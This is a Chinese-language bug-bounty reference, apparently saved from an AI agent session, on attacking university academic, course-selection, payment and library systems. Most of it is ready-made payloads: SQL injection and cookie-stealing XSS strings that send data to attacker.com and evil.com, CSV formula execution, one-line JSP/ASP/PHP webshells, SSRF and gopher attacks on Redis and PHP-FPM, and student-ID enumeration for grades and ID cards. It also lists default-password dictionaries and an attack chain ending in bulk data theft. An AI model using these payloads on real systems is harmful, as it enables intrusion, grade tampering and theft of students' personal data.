---
name: KB: 教育行业SRC通用漏洞挖掘实战
description: EDU-SRC教育行业通用漏洞挖掘技巧，覆盖教务系统/选课系统/学工系统/网络教学平台
type: reference
tags: [edu-src, 教育行业, 教务系统, 高校漏洞, 通用漏洞]
updated: 2026-05-09
originSessionId: ee20960f-1d7b-4892-a567-02767c979e0a
---
# 教育行业SRC通用漏洞挖掘实战

## 目录
1. [SQL注入](#sql注入)
2. [XSS跨站脚本](#xss跨站脚本)
3. [越权/IDOR](#越权idor)
4. [文件上传](#文件上传)
5. [SSRF服务端请求伪造](#ssrf服务端请求伪造)
6. [逻辑漏洞](#逻辑漏洞)
7. [信息泄露](#信息泄露)
8. [弱口令/默认密码](#弱口令默认密码)
9. [敏感接口未授权](#敏感接口未授权)

---

## 一、SQL注入

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **学号参数注入** | 成绩查询 `/score.jsp?studentNo=2024001` | 单引号/布尔盲注判断 | `studentNo=2024001' and 1=1--` / `2024001' and 1=2--` |
| **课程编号注入** | 课表查询 `/course/schedule.jsp?courseId=CS101` | 数字型注入，用 `2-1` 替代 `1` 观察 | `courseId=1-1` vs `courseId=1` 响应一致则数字型 |
| **学年学期参数** | 成绩单导出 `?year=2024&term=1` | 报错注入 | `term=1' AND extractvalue(1,concat(0x7e,(select user())))--` |
| **准考证号注入** | 考试查询 `examid=2024CS001` | 时间盲注 | `examid=2024CS001' AND SLEEP(5)--` |
| **教师工号注入** | 教师评教系统 `?teacherNo=T2024001` | UNION注入 | `teacherNo=T2024001' UNION SELECT 1,2,3,database(),5--` |
| **教室编号注入** | 空闲教室查询 `?room=101` | order by列数探测 | `room=101 order by 1--` 递增直到报错 |
| **图书馆检索注入** | 图书搜索 `?keyword=文学` | 字符型模糊搜索注入 | `keyword=文学' OR '1'='1'--` |
| **选课参数注入** | 选课系统 `?electiveId=202401` | Cookie/请求头注入 | `Cookie: electiveId=202401' OR SLEEP(5)--` |
| **一卡通查询注入** | 一卡通流水 `?cardNo=2024001` | 宽字节注入(GBK) | `cardNo=%df' UNION SELECT 1,2,3,user(),5--` |
| **招生查询注入** | 录取结果 `?examId=2412345678` | 布尔盲注逐字符 | `examId=2412345678' AND ASCII(SUBSTR((SELECT database()),1,1))>64--` |
| **MSSQL-教务系统** | 正方/强智系统参数 | MSSQL特有注入 | `studentNo=2024001'; WAITFOR DELAY '0:0:5'--` |
| **Oracle-教务系统** | 金智/青果系统参数 | Oracle注入 | `courseId=CS101' AND 1=dbms_pipe.receive_message('a',5)--` |
| **PostgreSQL注入** | 开源教学平台(Moodle等) | PostgreSQL报错 | `userid=1' AND 1=CAST((SELECT version()) AS numeric)--` |
| **JSON参数注入** | RESTful API选课 | JSON键值注入 | `{"course_id":"CS101' OR '1'='1"}` |
| **二次注入** | 学籍信息-姓名含SQL关键字 | 注册时在姓名中注入，管理后台触发 | 注册姓名: `admin'--` → 后台查询: `WHERE name='admin'--'` |
| **文件名字段注入** | 作业上传文件名记录到DB | Burp拦截改filename | `filename="test' OR SLEEP(5) OR '.jpg"` |
| **HTTP头注入** | IP日志记录到数据库 | XFF头注入 | `X-Forwarded-For: 127.0.0.1' OR SLEEP(5)--` |
| **GraphQL注入** | 现代教务系统GraphQL接口 | GraphQL参数注入 | `{course(id:"1' OR 1=1--"){name score}}` |

### 教育系统SQL注入高发点速查
```
/score.jsp?studentId=         → 学号查询
/course/select.jsp?kch=       → 课程号
/grade/query?xh=              → 学号
/jwglxt/cjcx/query?xh=        → 教务在线成绩查询
/xgxt/xszc/list?xh=           → 学工系统
/books/search?keyword=        → 图书馆检索
/exam/query?zkzh=             → 准考证号
/jiaowu/login?userid=         → 教务系统登录
/ykt/record?cardno=           → 一卡通
/zs/lqcx?ksh=                 → 招生录取
```

---

## 二、XSS跨站脚本

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **个人信息XSS** | 个人资料编辑-姓名/签名/自我介绍 | 存储型XSS，保存后每次页面加载触发 | `"><script>alert(document.cookie)</script>` |
| **论坛/留言板XSS** | 校园论坛、班级留言板 | 存储型，帖子和回复中注入 | `<img src=x onerror=alert(document.cookie)>` |
| **教师评教XSS** | 评教系统中的文字评价 | 存储型，管理员审核评教时触发 | `<svg/onload=fetch('//attacker.com/?'+document.cookie)>` |
| **作业提交XSS** | 作业描述/备注字段 | 存储型，教师批改时触发 | `<details open ontoggle=alert(document.cookie)>` |
| **实验报告标题XSS** | 实验报告标题字段 | 存储型 | `<input autofocus onfocus=alert(1)>` |
| **站内信XSS** | 教务系统站内消息 | 存储型，收件人打开消息触发 | `<script src=//evilsite.com/xss.js></script>` |
| **盲打XSS** | 反馈建议/投诉表单 | Blind XSS，后台管理员查看时触发 | `"><img src=x onerror="new Image().src='//attacker.com/'+document.cookie">` |
| **搜索框反射XSS** | 站内搜索、图书馆搜索、课程搜索 | 反射型，参数值在页面回显 | `<script>alert('XSS')</script>` 或 `<ScRiPt>alert(1)</ScRiPt>` |
| **User-Agent XSS** | 访问日志后台 | Blind XSS，管理员查看日志时触发 | `User-Agent: <script>fetch('//attacker/'+document.cookie)</script>` |
| **Referer反射XSS** | 教务系统登录错误页 | Referer头未过滤反射到页面 | `Referer: <svg onload=alert(1)>` |
| **文件名XSS** | 上传文件名为XSS payload | 文件名在页面展示未编码 | 文件名: `"><svg onload=alert(1)>.jpg` |
| **Markdown XSS** | 教学平台支持Markdown编辑 | Markdown渲染后的XSS | `[click](javascript:alert(1))` |
| **富文本编辑器XSS** | 通知公告、新闻发布 | 富文本编辑器标签过滤不严 | `<embed src=x onerror=alert(1)>` / `<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>` |
| **JSONP回调XSS** | JSONP接口跨域 | 回调参数反射 | `?callback=<script>alert(1)</script>` |
| **导出CSV-XSS** | 成绩导出CSV | CSV公式注入 | `=cmd|'/c calc'!A1` / `=HYPERLINK("http://evil.com?data="&A1,"click")` |
| **课表渲染XSS** | 课表展示页 | 课程名含XSS payload | 课程名改为 `<img src=1 onerror=alert('xss')>` |
| **成绩单展示XSS** | 成绩单明细页 | 课程名/成绩备注字段注入 | 成绩备注: `"><script src=//evil/x.js></script>` |
| **头像上传SVG-XSS** | 学工系统头像上传 | SVG文件XSS | 上传 `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` |

### 教育系统XSS高发点速查
```
/personal/profile/edit     → 个人信息编辑
/forum/post                 → 论坛发帖
/feedback/save              → 反馈建议
/search?keyword=            → 搜索框
/grade/export               → 成绩导出CSV
/message/send               → 站内信
/homework/submit            → 作业提交
/evaluate/save              → 评教评价
/user/avatar                → 头像上传
/oa/notice/edit             → 通知公告编辑
/teaching/material          → 教学资料上传
```

---

## 三、越权/IDOR

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **学号遍历查看成绩** | `/score/query?studentNo=2024001` | 遍历相邻学号查看他人成绩 | Burp Intruder: 学号 `2024001` ~ `2024100` |
| **学号遍历查课表** | `/course/schedule?xh=2024001` | 遍历学号获取全校课表 | `GET /schedule?xh=2024002` / `2024003` |
| **学号遍历查个人信息** | `/student/info?sno=2024001` | 遍历学号获取身份证/手机号 | `GET /api/student?studentNo=2024100` |
| **成绩单PDF遍历** | `/score/export?studentNo=2024001` | 遍历学号下载他人成绩PDF | `GET /export/score?studentNo=2024002` |
| **选课系统IDOR** | 替他人退课/选课 | POST请求修改studentId | `POST /elective/drop {"courseId":"CS101","studentId":"victim_学号"}` |
| **教务公告越权发布** | `/notice/publish?id=123` | 普通用户发公告 | `POST /notice/publish {"title":"X","content":"X"}` 低权限用户 |
| **成绩修改越权** | `/score/update?id=12345` | 普通学生改自己或他人成绩 | `POST /score/update {"scoreId":12345,"score":100}` |
| **教师评教越权** | 学生查看教师对他人评语 | /evaluate/view?studentId=遍历 | `GET /evaluate/view?studentId=victim_id` |
| **请假系统IDOR** | `/leave/view?id=123` | 遍历请假单ID看他人隐私 | `GET /leave/view?id=124` |
| **图书馆借阅记录** | `/library/history?cardNo=2024001` | 遍历查他人借阅历史 | `GET /library/history?cardNo=2024002` |
| **缴费记录IDOR** | `/payment/record?id=1001` | 遍历查他人缴费记录 | `GET /payment/record?id=1002` |
| **一卡通流水越权** | `/card/transactions?cardNo=2024001` | 遍历卡号查消费流水 | `GET /card/transactions?cardNo=2024002` |
| **宿舍分配信息** | `/dormitory/info?studentNo=2024001` | 遍历查他人宿舍信息 | `GET /dormitory/query?studentNo=2024002` |
| **招生录取信息越权** | `/admission/result?ksh=2424123456` | 遍历考生号查录取 | `POST /zs/query {"ksh":"2424123457"}` |
| **Mongo ObjectId遍历** | 使用ObjectId的现代教务系统 | 同分钟注册的用户ObjectId可预测 | ObjectId前4字节=unix时间戳，枚举同时段注册 |
| **Base64编码ID绕过** | ID字段base64编码 | 解码后改值再编码 | `GET /order/dXNlcl9pZD0yMDI0MDAx` 解码改学号 |
| **UUID泄露预测** | 其他端点泄露UUID后可预测 | 先收集一批UUID分析模式 | `/api/export` 泄露UUID → 越权访问 |
| **GraphQL别名IDOR** | GraphQL教务API | 同请求多别名查多人 | `{a:student(sno:"2024001"){phone} b:student(sno:"2024002"){phone}}` |
| **批量导入接口越权** | `/api/batch/import` | 批量接口缺行级鉴权 | `POST /api/batch/import {"studentNos":["2024001","2024002",...]}` |
| **API版本降级** | `/api/v2/student` 无IDOR但 `/api/v1/student` 有 | 测试旧版API | `GET /api/v1/student/2024100` |
| **HTTP方法切换** | GET受限改POST/PUT | 切换方法绕过越权检查 | `PUT /api/score/update` 代替 GET |

### 教育系统学号规律速查
```
学号构成示例: 2024 + 院系代码(2-3位) + 专业代码(2位) + 班级(2位) + 序号(2位)
             ↓入学年  ↓院系                         ↓班级     ↓序号
             2024    07                            01        01
常见院系代码: 01文学院 02理学院 03工学院 04计算机 05外语 06法学 07经管 08艺术...
南方高校: 学号多为10-12位纯数字
北方高校: 部分高校为字母+数字混合
独立学院: 学号可能含独立学院标识码
```

---

## 四、文件上传

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **头像上传任意文件** | 学工系统/教务系统头像 | 改Content-Type + 改后缀 | 上传 `shell.php` 改 `Content-Type: image/jpeg` |
| **头像上传SVG-XSS** | 头像支持SVG格式 | 上传含XSS的SVG | 上传SVG: `<svg xmlns="..." onload="alert(1)"/>` |
| **作业附件上传** | 作业提交系统 | 上传WebShell + 路径探测 | 上传 `jsp/php/asp` 一句话木马 |
| **作业提交文件类型绕过** | 限制doc/pdf但可改Content-Type | 改 `Content-Type: application/pdf` | POST body中filename改为 `shell.jsp;.pdf` |
| **作业上传路径穿越** | filename含路径穿越字符 | 覆盖敏感目录文件 | `filename=../../../../webapps/ROOT/shell.jsp` |
| **教学资料上传** | 教师上传课件/资料 | 上传脚本文件到可访问目录 | 上传 `shell.jsp` 后找路径访问 |
| **实验报告附件** | 实验报告提交 | 双扩展名+空字节截断 | `shell.php%00.pdf` / `shell.php.jpg` |
| **图片马+包含** | 上传图片马配合LFI | 写入PHP代码到图片 | 图片exif写入: `exiftool -Comment='<?php system($_GET[c]);?>' img.jpg` |
| **Zip解压穿越** | 批量上传压缩包解压 | Zip文件中含 `../` 路径 | 制作ZipSlip: `ln -s ../../shell.php evil.zip` |
| **CSV注入** | 成绩导出/导入 | 教务系统CSV导入导出公式注入 | 字段值: `=CMD|'/c powershell -enc ...'!A1` |
| **PDF上传XXE** | 支持PDF上传处 | 含XXE的恶意PDF | 编辑PDF注入DTD读取文件 |
| **Office文档XXE** | 上传docx/xlsx/xls | 解压修改XML再打包 | 编辑 `word/document.xml` 注入XXE |
| **头像图片大小限制绕过** | 限制文件大小 | 分块上传绕过 | `Content-Range: bytes 0-1024/2048` 分块 |
| **并发上传竞态** | 上传同名文件 | 并发上传触发TOCTOU | Turbo Intruder并发上传同名文件 |

### 教育系统文件上传高发点速查
```
/user/avatar/upload           → 头像上传
/homework/upload              → 作业提交
/teaching/material/upload     → 教学资料
/exam/paper/upload            → 试卷上传
/oa/attachment/upload         → OA附件
/activity/imageUpload         → 活动图片
/card/photoUpload             → 一卡通照片
/graduate/thesis/upload       → 毕业论文上传
/library/upload               → 图书馆资料
/student/evidence/upload      → 证明材料上传
```

### 教育系统常见一句话WebShell
```jsp
// JSP一句话 - 适用于教务系统(Tomcat)
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

// ASP一句话 - 适用于老旧ASP系统
<%eval request("cmd")%>

// PHP一句话 - 适用于Moodle等PHP平台
<?php @eval($_POST['cmd']);?>
```

---

## 五、SSRF服务端请求伪造

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **教务系统内网探测** | 课表/成绩PDF生成功能 | 构造URL参数请求内网资源 | `?url=http://127.0.0.1:8080/` 或 `?file=http://172.16.0.1/` |
| **头像URL加载SSRF** | 支持URL设置头像 | 替换头像URL为内网地址 | `avatarUrl=http://169.254.169.254/latest/meta-data/` |
| **课程资源URL抓取** | 教师添加课程URL资源 | 服务端抓取URL触发SSRF | `resourceUrl=http://127.0.0.1:3306` |
| **教学视频拉取SSRF** | 转发视频URL | 内网端口扫描 | `videoUrl=http://192.168.1.1:22` |
| **附件预览SSRF** | Office文档在线预览 | 文档URL指向内网 | `docUrl=http://internal-server/secret.docx` |
| **Webhook回调** | 教务系统webhook配置 | 回调地址指向内网 | `webhookUrl=http://127.0.0.1:2375/containers` |
| **IP黑名单绕过** | 教育网内网IP: 10.0.0.0/8, 172.16.0.0/12, 100.100.100.200 | 多种进制/IP表示法 | `http://0x7f000001/` / `http://2130706433/` / `http://[::1]/` |
| **DNS重绑定** | 教育系统URL白名单检查 | DNS重绑定绕过白名单 | `http://id.127.0.0.1.rbndr.us/` |
| **302跳转SSRF** | 限制URL白名单 | 先用合法域名+302跳转内网 | 注册域名指向内网→目标302跳转内网 |
| **云元数据获取** | 教育系统部署在云上 | 获取云服务器凭证 | 阿里云: `http://100.100.100.200/latest/meta-data/` |
| **Redis未授权SSRF** | 内网Redis探测 | gopher协议攻击Redis | `gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/` |
| **内网FastCGI RCE** | 内网PHP-FPM探测 | gopher打PHP-FPM | `gopher://127.0.0.1:9000/_<fastcgi_payload>` |
| **Docker API未授权** | K8s/Docker内网探测 | 操作内网Docker | `http://127.0.0.1:2375/containers/create` |
| **教育网内网特定网段** | 教育网特有内网段 | 探测教育专网 | 教育网内网段: `10.10.x.x` / `10.11.x.x` / `10.20.x.x` |
| **PDF生成引擎SSRF** | 成绩单/证书PDF生成 | PDF引擎访问内网 | `wkhtmltopdf` SSRF: `?url=@127.0.0.1:8443` |
| **xxe+ssrf组合** | XML上传点 | XXE→SSRF内网探测 | `<!ENTITY xxe SYSTEM "http://10.10.0.1:8080">` |

### 教育系统SSRF高发场景
```
PDF导出功能: /export/pdf?url=     → 课表/成绩单导出PDF
头像设置: /avatar/url?avatar=     → URL设置头像
资源拉取: /proxy/fetch?url=       → 课程资源代理
Webhook: /api/webhook?callback=   → 系统回调
转码服务: /video/convert?url=     → 视频转码
文件预览: /preview?file=          → 在线文档预览
OCR识别: /ocr/scan?imageUrl=      → 图片文字识别
```

---

## 六、逻辑漏洞

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **选课时间绕过** | 选课系统前端控制选课时间 | 修改客户端时间/直接发POST | `POST /elective/add {"courseId":"CS101"}` 非选课时间也成功 |
| **选课人数限制绕过** | 选课有人数上限 | 并发抢课 | Turbo Intruder: 选课请求20并发，突破人数限制 |
| **退课退款逻辑** | 退课后返还学分/费用 | 多次退课同一门 | 并发发送退课请求，重复返还学分或费用 |
| **缴费金额篡改** | 学费/住宿费/考试费在线支付 | 拦截改金额参数 | `price:5000` → `price:0.01` |
| **缴费状态篡改** | 支付结果回调 | 改响应结果为已支付 | `{"pay_status":"failed"}` → `"success"` |
| **负数缴费** | 缴费金额为负时退款 | 数量改为负值 | `quantity=-1` 金额变为负数 |
| **优惠券/减免并发** | 学费减免/助学金 | 并发使用同一减免码 | 同一助学减免码50次并发 → 全部通过 |
| **学分互认逻辑** | 学分转换/互认 | 重复申请学分互认 | 同一门课多次申请学分互认，学分累计叠加 |
| **转专业逻辑** | 转专业申请审批 | 审批流程绕过 | 直接请求审批通过接口 |
| **免听申请绕过** | 免听课程审批 | 跳过审批步骤 | 多步流程Step1→Step3绕过中间审批 |
| **考试报名限报绕过** | 四六级/竞赛报名名额限制 | 并发报名 | 名额100人，200并发全部报名成功 |
| **成绩修改逻辑** | 成绩复核申请 | 多次提交复核申请 | 同一门课反复提交复核→成绩不断重算 |
| **补考/重修费用** | 补考报名+重修缴费 | 补考不通过不缴费 | 补考报名→不缴费→仍可参加考试 |
| **课程冲突绕过** | 选课系统课程排课冲突检查 | 并发选冲突课程 | 同时提交两门时间冲突的课程选课请求→均通过 |
| **毕业审核绕过** | 毕业资格审核 | 修改毕业审核状态 | `{"graduated": false}` → `true` |
| **奖学金申请** | 成绩排名/资格判断 | 篡改申请条件参数 | `{"gpa":3.0,"rank":"top10%"}` → 改条件参数 |
| **实习/实践学分** | 实习报告/实践证明上传 | 重复提交同一实践 | 同一实践证明多次提交，每次加学分 |
| **投票/评选刷票** | 优秀学生/班级评选 | 取消投票限制 | 删除 `voted=true` Cookie 或 IP轮换刷票 |
| **注册覆盖已有账号** | 入学注册覆盖 | 用已有学号注册覆盖 | 注册时填已存在的学号 → 覆盖原账号 |
| **邮箱/手机验证绕过** | 学工系统绑定手机/邮箱 | 跳过验证步骤 | 直接POST `/bind/phone` 不加验证码验证 |

### 教育系统典型业务逻辑脆弱点
```
选课:    /elective/add|drop          → 选课时间/人数/冲突限制
缴费:    /payment/pay|callback       → 金额/状态篡改
退课:    /course/drop|refund         → 退课退款逻辑
评教:    /evaluate/submit            → 重复评教/越权评教
报名:    /exam/signup                → 四六级/竞赛/补考报名
审批:    /approve/process            → 转专业/免听/休学审批
投票:    /vote/submit                → 刷票/重复投票
助学金:  /scholarship/apply          → 重复申请/条件篡改
成绩:    /score/appeal               → 成绩复核/修改
毕业:    /graduate/audit             → 毕业审核
实习:    /internship/submit          → 实习学分
```

---

## 七、信息泄露

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **学号规律泄露** | 学号生成规则可预测 | 分析几个学号发现规律 | 入学年+院系代码+专业+班级+序号 → 批量生成有效学号 |
| **成绩单泄露** | 成绩单PDF直接访问 | 遍历URL下载 | `GET /export/score_2024001.pdf` → 遍历 |
| **头像/照片泄露** | 学工系统头像含学号 | 遍历头像路径 | `GET /avatar/2024001.jpg` → 遍历 |
| **学生证/校园卡图片** | 学生证/校园卡上传图片 | 路径遍历 | `GET /uploads/student_card/2024001.jpg` |
| **身份证正面照泄露** | 入学提交身份证照片 | 直接访问图片链接 | `GET /uploads/idcard/2024001_front.jpg` |
| **家庭住址信息** | 学籍档案含家庭地址 | IDOR遍历 | `GET /student/address?sno=2024001` |
| **手机号/联系方式** | 通讯录/班级通讯录 | 未授权访问 | `GET /class/contacts?classId=CS2024` |
| **家长信息泄露** | 入学登记家长信息 | IDOR或未授权 | `GET /student/parent?sno=2024001` |
| **准考证号泄露** | 四六级/考试查询 | 遍历准考证号 | 准考证: 学校代码+校区+年份+考场+座位 |
| **Swagger文档泄露** | 高校API接口文档 | 访问文档发现所有API | `GET /swagger-ui.html` / `v2/api-docs` |
| **Swagger未授权操作** | API文档可直接调用 | 通过Swagger直接调后端API | Swagger UI上直接调 `DELETE /api/user/1` |
| **Spring Actuator** | Spring Boot教务系统 | Actuator端点泄露 | `GET /actuator/env` → 环境变量含数据库密码 |
| **目录遍历列目录** | 高校文件服务器 | 列目录泄露文件 | `GET /uploads/` → 目录列表全部文件 |
| **JS敏感信息** | 教务系统前端JS | 提取API端点/密钥 | JS中: `baseURL:'http://internal-api.edu/'` |
| **Git泄露** | 高校Git仓库泄露 | 检查.git目录 | `GET /.git/HEAD` → dump源码 |
| **备份文件** | 教务系统备份 | 检查常见备份路径 | `GET /backup.zip` / `web.rar` / `wwwroot.tar.gz` |
| **robots.txt** | 搜索引擎收录 | robots.txt暴露后台 | `GET /robots.txt` → `Disallow: /admin/` |
| **Sitemap泄露** | 站点地图 | 发现隐藏路径 | `GET /sitemap.xml` |
| **报错信息泄露** | 触发错误 | 获取数据库路径/版本 | 输入: `'` → 报错: `SQL Server 2019 Error in D:\jiaowu\...` |
| **默认上传路径** | 已知常见路径组合 | 访问上传目录 | `http://edu.cn/upload/` / `http://edu.cn/files/` |

### 教育系统常见敏感信息路径
```
/.git/HEAD                    → Git源代码泄露
/swagger-ui.html              → Swagger API文档
/v2/api-docs                  → Swagger JSON
/actuator/env                 → Spring环境变量
/actuator/heapdump            → Heap Dump
/robots.txt                   → 敏感路径
/sitemap.xml                  → 站点结构
/backup.zip                   → 网站备份
/WEB-INF/web.xml              → Java配置
/uploads/                     → 上传目录
/files/                       → 文件目录
/export/                      → 导出文件
/student/photos/              → 学生照片目录
```

---

## 八、弱口令/默认密码

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **学号密码** | 多数高校初始密码为学号 | 学号/学号后6位 | `username=2024001` `password=2024001` |
| **身份证后6位** | 初始密码为身份证后6位 | 身份证社工获取或遍历 | 从身份证号取后6位尝试 |
| **默认密码admin** | 教师/管理员账号 | 用户名admin密码admin | `admin/admin` `admin/123456` |
| **默认密码000000** | 学生系统初始密码 | 大量学号+000000 | `studentNo=2024001` `password=000000` |
| **默认密码123456** | 最常见弱密码 | 所有账号尝试 | `123456` `12345678` |
| **默认密码身份证号** | 初始密码全身份证 | 社工获取后登录 | `username=2024001` `password=410123200601011234` |
| **默认密码空密码** | 部分系统初始密码为空 | 直接不输密码登录 | `password=` |
| **密码与用户名相同** | 部分系统默认设置 | 相同账号密码 | `teacherNo=T2024001` / `password=T2024001` |
| **统一身份认证弱密码** | CAS统一认证系统 | 常见弱密码 | `123456` `111111` `123123` `abc123` |
| **教师初始密码** | 工号+特定后缀 | 工号+后缀组合 | `T2024001` + `T2024001@edu` |
| **VPN弱密码** | 高校VPN系统 | 常见VPN默认密码 | `vpn@edu` `123456` |
| **WiFi/校园网密码** | 校园网认证系统 | 默认密码组合 | `学号+身份证后4位` |
| **Moodle/Blackboard默认** | LMS平台默认 | moodle默认admin | `admin` / `password` |
| **Tomcat管理弱口令** | 教务系统Tomcat后台 | Tomcat默认密码 | `tomcat/tomcat` `admin/admin` |
| **MySQL弱口令** | 教育系统数据库 | 内网MySQL弱口令 | `root/root` `root/123456` `root/空密码` |
| **SSH弱口令** | 教育网服务器SSH | root弱密码探测 | `root/root` `root/123456` `root/password` |
| **Redis未授权** | 教育网Redis | 无密码直接访问 | `redis-cli -h 10.10.x.x` |
| **MongoDB未授权** | 教育网MongoDB | 无密码直接访问 | `mongo 10.10.x.x:27017` |
| **Elasticsearch未授权** | 教育网ES | 无密码访问 | `curl http://10.10.x.x:9200/_cat/indices` |

### 教育系统常见默认密码规律
```
学生: 学号 | 学号后6位 | 身份证后6位 | 000000 | 123456 | 111111 | 空密码
教师: 工号 | 工号+@edu | admin/123456 | 身份证号 | 工号+@school
管理员: admin/admin | admin/123456 | admin/admin123 | admin/学校缩写
VPN/SSH: 学号/默认密码 | root/root | root/123456
数据库: root/root | root/空密码 | sa/123456 | jiaowu/jiaowu123
```

### 教育系统撞库常用字典组合
```
学生:
  学号本体: 2024001
  学号后6位: 24001
  身份证后6位: 123456
  生日(MMDD): 0101
  手机号后6位: 138000

教师:
  工号: T2024001
  工号+@: T2024001@
  姓名拼音+123: zhangsan123
  姓名首字母+工号: zs2024001
```

---

## 九、敏感接口未授权

| 漏洞类型 | 教育场景 | 测试方法 | Payload/示例 |
|----------|----------|----------|--------------|
| **成绩API未授权** | 成绩查询REST接口 | 直接访问无token | `GET /api/score/student/2024001` |
| **课表API未授权** | 课表查询接口 | 无cookie直接访问 | `GET /api/course/schedule/2024001` |
| **学生信息API** | 学生基本信息接口 | 批量获取 | `GET /api/student/2024001` 返回含身份证/手机/家庭地址 |
| **教师信息API** | 教师信息接口 | 未授权获取 | `GET /api/teacher/T2024001` |
| **考试成绩批量接口** | 班级/专业成绩查询 | 未授权批量导出 | `GET /api/score/class/CS202401` |
| **全校学生列表** | 学生名单接口 | 无认证直接访问 | `GET /api/student/list?page=1` |
| **全校教师列表** | 教师名单接口 | 信息泄露 | `GET /api/teacher/list` |
| **课程列表API** | 全校课程数据 | 未授权访问 | `GET /api/course/list?semester=2024-2025-1` |
| **教室使用情况** | 空闲教室数据 | 未授权获取 | `GET /api/room/status` |
| **一卡通消费记录** | 消费流水接口 | 遍历卡号 | `GET /api/card/transactions/2024001` |
| **宿舍分配API** | 宿舍管理系统 | 未授权批量 | `GET /api/dormitory/assignments?building=A` |
| **缴费记录API** | 学生缴费查询 | 未授权遍历 | `GET /api/payment/history/2024001` |
| **借阅记录API** | 图书馆借阅 | 未授权获取 | `GET /api/library/borrow/2024001` |
| **评教结果API** | 评教分数统计 | 未授权查看 | `GET /api/evaluate/teacher/T2024001` |
| **招生录取API** | 录取结果查询 | 未授权查他人 | `GET /api/admission/result?ksh=2424123456` |
| **校园卡照片API** | 一卡通照片 | 未授权获取 | `GET /api/card/photo/2024001` |
| **教务处公告管理** | 公告发布接口 | POST未授权 | `POST /api/notice/publish` |
| **课程评分管理** | 课程评分统计 | 未授权修改 | `POST /api/course/rate/update` |
| **学籍变动API** | 休学/复学/转专业 | 未授权操作 | `POST /api/student/status/update {"sno":"2024001","status":"suspended"}` |
| **毕业审核API** | 毕业状态接口 | 未授权修改 | `POST /api/graduate/verify {"sno":"2024001","passed":true}` |

### 教育系统API路径规律速查
```
RESTful风格:
  /api/student/{sno}
  /api/teacher/{tno}
  /api/course/{courseId}
  /api/score/{sno}
  /api/schedule/{sno}/{semester}
  /api/payment/{sno}
  /api/library/{cardNo}

传统风格:
  /jwglxt/          → 教务管理
  /xsgl/            → 学生管理
  /jzgl/            → 教职工管理
  /pygl/            → 培养管理
  /xkgl/            → 选课管理
  /ksgl/            → 考试管理
  /cjgl/            → 成绩管理
  /pygl/            → 评优管理
  /zsgl/            → 招生管理
  /bygl/            → 毕业管理
  /tsg/             → 图书馆
  /ykgl/            → 一卡通管理
  /xsg/             → 学生工作
  /xsfw/            → 学生服务
```

---

## 附录A：教育系统资产发现速查

### 常见子域名
```
jwxt.xxx.edu.cn           → 教务系统
jwc.xxx.edu.cn            → 教务处
cas.xxx.edu.cn            → 统一身份认证
portal.xxx.edu.cn         → 门户
eams.xxx.edu.cn           → 选课系统(正方)
xk.xxx.edu.cn             → 选课
lib.xxx.edu.cn            → 图书馆
ykt.xxx.edu.cn            → 一卡通
xsgz.xxx.edu.cn           → 学生工作
jxjy.xxx.edu.cn           → 继续教育
yjsc.xxx.edu.cn           → 研究生院
zjc.xxx.edu.cn            → 招生就业
hqjt.xxx.edu.cn           → 后勤集团
oa.xxx.edu.cn             → 办公系统
mail.xxx.edu.cn           → 邮件
vpn.xxx.edu.cn            → VPN
moodle.xxx.edu.cn         → Moodle教学平台
blackboard.xxx.edu.cn     → Blackboard
zhihuijiaoxue.xxx.edu.cn  → 智慧教学
```

### 常见教务系统厂商指纹
```
正方(Zhengfang): 
  URL特征: jwglxt, eams, zf
  页面特征: "正方教务管理系统" / "Zhengfang"
  指纹: /js/zf_common.js / js/zf_auth.js

强智(Qiangzhi):
  URL特征: qz, qzxy, jiaowu
  页面特征: "强智教务管理系统"
  指纹: /qzui/ /qzapp/

金智(Wisedu):
  URL特征: wisedu, wu, portal
  页面特征: "金智" / "Wisedu"
  指纹: /wisedu/ /cas/

青果(Qingguo):
  URL特征: qingguo, qg
  页面特征: "青果教务系统"
  指纹: /qg/

U校园/Unipus:
  外研社平台
  特征: unipus.cn

超星(Chaoxing):
  网络教学平台
  特征: chaoxing.com / xueyin.chaoxing.com
  指纹: /mooc/ /course/

慕课(MOOC):
  中国大学MOOC
  特征: icourse163.org

雨课堂:
  特征: yuketang.cn

Moodle:
  /theme/ /pluginfile.php
  "Moodle" footer
  /login/index.php

Blackboard:
  /webapps/ /bb_/
  "Blackboard" footer
```

### 教育系统TOP 10默认端口
```
80      → HTTP
443     → HTTPS
8080    → Tomcat/备用Web
8443    → HTTPS备选
3306    → MySQL
1433    → MSSQL
6379    → Redis
27017   → MongoDB
9200    → Elasticsearch
22      → SSH
```

---

## 附录B：教育系统通用挖掘流程

### 阶段性攻击链

```
阶段一：资产收集
  1. 搜集 edu.cn 主域下子域名
  2. 识别教务系统/选课系统/学工系统/教学平台
  3. 指纹识别: 正方/强智/金智/青果/超星/Moodle
  4. 端口扫描: 寻找非标准端口Web服务
  5. API文档: swagger/actuator/robots.txt

阶段二：信息收集
  1. 获取一批学生学号（爬虫/遍历/泄露）
  2. 获取教务系统默认密码策略
  3. 分析学号编码规律
  4. JS提取隐藏API端点

阶段三：漏洞挖掘
  1. 弱口令登录 → 越权遍历
  2. 成绩/课表接口IDOR遍历
  3. 所有参数SQL注入探测
  4. 所有输入点XSS探测
  5. 文件上传四大点: 头像/作业/附件/资料
  6. URL参数SSRF探测
  7. 选课/缴费/退课逻辑测试

阶段四：利用
  1. 信息泄露组合利用 → 账号接管
  2. 弱口令批量登录 → 横向移动
  3. SQL注入 → 数据获取
  4. 越权遍历全校数据 → 数据打包
  5. SSRF → 内网漏洞利用
```

### 常用工具组合
```
信息收集:
  subfinder + httpx → 子域名发现
  katana + gau → URL/端点收集
  naabu → 端口扫描
